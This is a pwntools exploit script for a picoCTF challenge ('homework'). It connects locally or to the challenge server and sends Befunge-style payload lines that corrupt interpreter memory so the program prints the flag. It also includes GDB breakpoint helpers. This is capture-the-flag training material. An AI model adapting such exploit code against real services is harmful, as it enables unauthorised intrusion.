from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './homework'
HOST = 'mars.picoctf.net'
PORT = 31689

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET, aslr=False)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a():
	r.sendlineafter('A', 'A')

r = start()
if args.D:
	# debug(r, [0x1641]) # right arrow
	# debug(r, [0x19a1]) # printf
	debug(r, [0x1a5f]) # putchar
	# debug(r, [0x1673]) # up arrow
	# debug(r, [0x1be4]) # get borad [g]
	# debug(r, [0x1b19]) # get borad [g]
	# debug(r, [0x1d74]) # set borad [p]
	# debug(r, [0x1e0e]) # 0

# 1. overwrite col to 0x16 -> 0x3216
# 2. load and print flag with 'g(0, 0x480+i)' and ','

payload = ''
payload += '0!:+::+:+:+::+++::0!v'
r.sendline(payload)

payload = ''
payload += 'v0,g\x5c++:!0::p\x5c++:+::<'
r.sendline(payload)

payload = ''
payload += '>!:>:0!:+:+:+:+:+:+:v'
r.sendline(payload)

payload = ''
payload += '<<,^+!0,g0+++:+:+::+<'
r.sendline(payload)

flag = ''
while '}' not in flag:
	flag += r.recv(1)
print flag
r.interactive()
r.close()
